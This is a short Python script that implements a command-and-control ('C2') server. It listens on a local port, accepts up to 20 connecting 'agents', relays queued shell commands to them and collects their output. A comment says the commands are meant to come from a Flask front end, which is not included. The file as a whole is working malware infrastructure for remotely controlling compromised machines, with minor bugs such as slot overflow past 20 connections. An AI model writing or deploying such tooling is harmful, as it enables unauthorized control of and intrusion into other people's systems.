import time
import socket
import threading

# Server Configuration
ip_address = '127.0.0.1'
port_number = 1234
THREADS = []
IPS = []
CMD_INPUT = []
CMD_OUTPUT = []
AGANTS_COUNT= 20

# Predefine slots for 20 clients
for _ in range(AGANTS_COUNT := 20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

# Function to handle a client
def handle_connection(connection, address, thread_index):
    global CMD_INPUT, CMD_OUTPUT
    IPS[thread_index] = address[0]  # Store client IP

    print(f"[+] Agent {thread_index+1} connected from {address}")

    while True:
        try:
            # Wait for a command from Flask
            while CMD_INPUT[thread_index] == '':
                time.sleep(1)

            # Send command to client
            command = CMD_INPUT[thread_index]
            CMD_INPUT[thread_index] = ''
            print(f"[*] Sending command to Agent {thread_index+1}: {command}")
            connection.send(command.encode())

            # Receive command output
            output = connection.recv(4096).decode()
            CMD_OUTPUT[thread_index] = output
            print(f"[+] Output from Agent {thread_index+1}: {CMD_OUTPUT[thread_index]}")

        except (ConnectionResetError, BrokenPipeError):
            print(f"[-] Connection lost with Agent {thread_index+1}")
            IPS[thread_index] = ''
            CMD_INPUT[thread_index] = ''
            CMD_OUTPUT[thread_index] = ''
            break

    connection.close()

# Start server
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_address, port_number))
    server_socket.listen(5)

    print(f"[+] C2 Server listening on {ip_address}:{port_number}")

    while True:
        connection, address = server_socket.accept()
        print(f"[+] Connection from {address}")

        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, thread_index), daemon=True)
        THREADS.append(t)
        t.start()

if __name__ == "__main__":
    start_server()